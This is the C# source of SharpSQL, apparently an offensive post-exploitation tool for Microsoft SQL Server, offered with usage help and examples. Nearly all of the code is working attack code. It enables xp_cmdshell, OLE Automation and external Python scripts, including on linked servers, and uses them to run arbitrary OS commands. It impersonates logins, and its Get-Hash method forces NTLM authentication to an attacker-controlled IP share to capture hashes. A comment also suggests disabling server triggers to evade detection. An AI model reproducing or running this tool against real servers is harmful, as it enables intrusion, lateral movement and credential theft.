using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Data.SqlClient;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;


namespace SharpSQL
{
    class Program
    {
        public static void ShowHelp()
        {
            Console.WriteLine(
@"
SharpSQL by @mlcsec

Usage:

    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-Command <whoami>] [-Query <query>]

Options:

    -Instance                  - The instance to taget
    -db                        - The db to connect to (default: master)
    -LinkedInstance            - The linked instance to target
    -ip                        - The IP to xp_dirtree (share: /pwn)
    -User                      - The user to impersonate
    -Command                   - The command to execute (default: whoami - Invoke-OSCmd and Invoke-LinkedOSCmd)
    -Query                     - The raw SQL query to execute
    -help                      - Show  help

Methods:
    Get-SQLInstanceDomain      - Get SQL instances within current domain via user and computer SPNs (no parameters required)
    Get-Databases              - Get available databases (-Instance required)
    Get-DBUser                 - Get database user via USER_NAME (-Instance required)
    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin') (-Instance required)
    Get-Hash                   - Get hash via xp_dirtree (-Instance and -ip required)
    Get-ImpersonableUsers      - Get impersonable users (-Instance required)
    Get-LinkedServers          - Get linked SQL servers (-Instance required)
    Get-LinkedPrivs            - Get current user privs for linked server (-Instance and -LinkedInstance required)
    Get-Sysadmins              - Get sysadmin users (-Instance required)
    Get-SystemUser             - Get system user via SYSTEM_USER (-Instance required)
    Get-SQLQuery               - Execute raw SQL query (-Instance and -Query required)
    Get-Triggers               - Get SQL server triggers (-Instance required)
    Get-Users                  - Get users from syslogins (-Instance required)
    Get-UserPrivs              - Get current user server privileges (-Instance required)
    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance (-Instance required)
    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server (-Instance and -LinkedInstance required)
    Enable-Cmdshell            - Enable xp_cmdshell on instance (-Instance required)
    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server (-Instance and -LinkedInstance required)
    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance (-Instance required)
    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server (-Instance and -LinkedInstance required)
    Ivnoke-ExternalScript      - Invoke external python script command execution (-Instance required)
    Invoke-OLEObject           - Invoke OLE wscript command execution (-Instance required)
    Invoke-UserImpersonation   - Impersonate user (-Instance and -User required)

Examples:

    SharpSQL.exe Get-SQLInstanceDomain
    SharpSQL.exe Get-UserPrivs -Instance sql.server
    SharpSQL.exe Get-Sysadmins -Instance sql.server
    SharpSQL.exe Get-LinkedServers -Instance sql.server
    SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
    SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command ""whoami /all""
    SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command ""dir C:\users\""
");
        }

        static void ParseArgs(string[] args)
        {

            int iter = 0;

            foreach (string item in args)
            {
                switch (item)
                {
                    case "-Instance":
                    case "-instance":
                        Config.instance = args[iter + 1];
                        break;
                    case "-ip":
                        Config.ip = args[iter + 1];
                        break;
                    case "-db":
                        Config.db = args[iter + 1];
                        break;
                    case "-LinkedInstance":
                    case "-linkedinstance":
                        Config.linkedinstance = args[iter + 1];
                        break;
                    case "-User":
                    case "-user":
                        Config.user = args[iter + 1];
                        break;
                    case "-Command":
                    case "-command":
                        Config.command = args[iter + 1];
                        break;
                    case "-Query":
                    case "-query":
                        Config.query = args[iter + 1];
                        break;
                    default:
                        break;
                }
                ++iter;
            }
        }


        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();

            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }



        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String query = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(query);

            if (role == 1)
            {
                Console.WriteLine($"'{groupToCheck}' group member");
            }
            else
            {
                Console.WriteLine($"not '{groupToCheck}' group member");
            }
        }



        public static void GetSQLInstanceDomain()
        {
            string[] spns = { };
            List<string> list = new List<string>(spns.ToList());

            using (var context = new PrincipalContext(ContextType.Domain))
            {
                using (var searcher = new PrincipalSearcher(new ComputerPrincipal(context)))
                {
                    foreach (var result in searcher.FindAll())
                    {
                        DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;

                        foreach (string spn in de.Properties["serviceprincipalname"])
                        {
                            Match cont = Regex.Match(spn, "MSSQL");
                            if (cont.Success)
                            {
                                list.Add(spn);
                            }
                        }
                    }
                }
            }

            using (var context = new PrincipalContext(ContextType.Domain))
            {
                using (var searcher = new PrincipalSearcher(new UserPrincipal(context)))
                {
                    foreach (var result in searcher.FindAll())
                    {
                        DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;

                        foreach (string spn in de.Properties["serviceprincipalname"])
                        {
                            Match cont = Regex.Match(spn, "MSSQL");
                            if (cont.Success)
                            {
                                list.Add(spn);
                            }
                        }
                    }
                }
            }

            spns = list.ToArray();
            Console.WriteLine("[*] Get-SQLInstanceDomain: ");
            foreach (var i in spns)
            {
                Console.WriteLine(i);
            }
        }



        static void Main(string[] args)
        {

            if (args.Length < 1)
            {
                ShowHelp();
                return;
            }

            if (args.Contains("-help"))
            {
                ShowHelp();
                return;
            }

            ParseArgs(args);


            string command = args[0];
            if (string.Equals(command, "Get-SQLInstanceDomain", StringComparison.CurrentCultureIgnoreCase))
            {
                GetSQLInstanceDomain();
                Environment.Exit(0);
            }


            if (string.IsNullOrEmpty(Config.instance))
            {
                Console.WriteLine("[!] No SQL instance supplied!");
                Environment.Exit(0);
            }


            string conStr = $"Server = {Config.instance}; Database = {Config.db}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conStr);

            try
            {
                con.Open();
                Console.WriteLine($"[*] Authenticated to: {Config.instance}");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to: {Config.instance} failed");
                System.Environment.Exit(0);
            }


            /////////////////////////////////////////////////////////////////////////////////////////////////////
            // Enumeration

            if (string.Equals(command, "Get-Users", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT name FROM master..syslogins;", con);
                Console.WriteLine("[*] Get-Users: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-SystemUser", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT SYSTEM_USER;", con);
                Console.WriteLine("[*] Get-SystemUser: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-UserPrivs", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');", con);
                Console.WriteLine("[*] Get-UserPrivs: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-Triggers", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT name FROM sys.server_triggers;", con);
                Console.WriteLine("[*] Get-Triggers: ");
                // can then disable the trigger: "disable trigger <trigger name> on all server"
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Get-Sysadmins", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT name FROM master..syslogins WHERE sysadmin = '1';", con);
                Console.WriteLine("[*] Get-Sysadmins: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-DBUser", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT USER_NAME();", con);
                Console.WriteLine("[*] Get-DBUser: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-GroupMembership", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("[*] Get-GroupMembership: ");
                getGroupMembership("public", con);
                getGroupMembership("sysadmin", con);
            }


            else if (string.Equals(command, "Get-ImpersonableUsers", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
                Console.WriteLine("[*] Get-ImpersonableUsers: ");
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Get-LinkedServers", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("EXEC sp_linkedservers;", con);
                Console.WriteLine("[*] Get-LinkedServers: ");
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Get-Databases", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT * FROM sys.databases;", con);
                Console.WriteLine("[*] Get-Databases: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-SQLQuery", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.query))
                {
                    Console.WriteLine("[!] No query supplied!");
                    Console.WriteLine("SharpSQL.exe Get-SQLQurery -Instance sql.server -Query \"select @@servername\"");
                    Environment.Exit(0);
                }
                else
                {
                    string query = executeQuery($"{Config.query}", con);
                    Console.WriteLine("[*] Get-SQLQuery: ");
                    Console.WriteLine($"{query}");
                }
            }



            else if (string.Equals(command, "Check-Cmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT value FROM sys.configurations WHERE name ='xp_cmdshell';", con);
                Console.WriteLine("[*] Check-Cmdshell: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Check-LinkedCmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linked instance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Check-LinkedCmdshell -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {

                    //string query = executeQuery($"EXEC ('SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell''') AT [{Config.linkedinstance}];", con);  // RPC fail
                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell''');", con);
                    Console.WriteLine("[*] Check-LinkedCmdshell: ");
                    Console.WriteLine($"{query}");
                }
            }


            else if (string.Equals(command, "Get-LinkedPrivs", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linked instance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Get-LinkedPrivs -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {
                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'SELECT permission_name FROM fn_my_permissions(NULL, ''SERVER'')');", con);
                    Console.WriteLine("[*] Get-LinkedPrivs: ");
                    Console.WriteLine($"{query}");
                }
            }


            else if (string.Equals(command, "Invoke-UserImpersonation", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.user) || (string.IsNullOrEmpty(Config.query)))
                {
                    Console.WriteLine("[!] No user supplied!");
                    Console.WriteLine("[!] No query supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Invoke-UserImpersonation -Instance sql.server -User sa");
                    Environment.Exit(0);
                }

                else
                {
                    string query = executeQuery($"EXECUTE AS LOGIN = '{Config.user}';", con);
                    query = executeQuery($"{Config.query};", con);
                    Console.WriteLine("[*] Invoke-UserImpersonation: ");
                    Console.WriteLine($"{query}");
                }
            }





            /////////////////////////////////////////////////////////////////////////////////////////////////////
            // Code Execution
            else if (string.Equals(command, "Enable-Cmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
                query = executeQuery($"EXEC xp_cmdshell 'whoami'", con);
                Console.WriteLine("[+] Enable-Cmdshell: ");
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Enable-LinkedCmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linked instance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Enable-LinkedCmdshell -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {
                    //string query = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{Config.linkedinstance}];", con); // RPC fail
                    //query = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [{Config.linkedinstance}];", con);
                    //query = executeQuery($"EXEC ('xp_cmdshell ''whoami'';') AT [{Config.linkedinstance}];", con);

                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''show advanced options'', 1; reconfigure;');", con); // metadata error
                    query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''xp_cmdshell'', 1; reconfigure;');", con);
                    query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'exec xp_cmdshell ''whoami'' WITH RESULT SETS ((output VARCHAR(MAX)))');", con);
                    Console.WriteLine("[*] Enable-LinkedCmdshell: ");
                    Console.WriteLine($"{query}");
                }
            }



            else if (string.Equals(command, "Get-Hash", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.ip))
                {
                    Console.WriteLine("[!] No share supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10");
                    Environment.Exit(0);
                }
                else
                {
                    string query = executeQuery($"EXEC master..xp_dirtree '\\\\{Config.ip}\\pwn', 1, 1;", con);
                    Console.WriteLine("[*] Get-Hash");
                    Console.WriteLine($"[*] Check for hash at: {Config.ip}");
                }
            }


            else if (string.Equals(command, "Invoke-ExternalScript", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("EXEC sp_configure 'external scripts enabled', 1; RECONFIGURE;", con);
                query = executeQuery($"EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system(\"{Config.command}\");';", con);
                Console.WriteLine("[*] Invoke-ExternalScript: ");
                Console.WriteLine($"{query}");
            }


            //EXECUTE AS LOGIN = 'sa';
            else if (string.Equals(command, "Invoke-OLEObject", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery($"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
                query = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{Config.command}';", con);
                Console.WriteLine("[*] Invoke-OLEObject: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Invoke-OSCmd", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery($"EXEC master..xp_cmdshell '{Config.command}';", con);
                Console.WriteLine("[*] Invoke-OSCmd: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Invoke-LinkedOSCmd", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linkedinstance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {
                    //string query = executeQuery($"EXEC ('xp_cmdshell ''{Config.command}'';') AT [{Config.linkedinstance}];", con); // RPC fail 
                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'exec xp_cmdshell ''{Config.command}'' WITH RESULT SETS ((output VARCHAR(MAX)))')", con);
                    Console.WriteLine("[*] Invoke-LinkedOSCmd: ");
                    Console.WriteLine($"{query}");
                }
            }


            else
            {
                ShowHelp();
                return;
            }
        }
    }
}
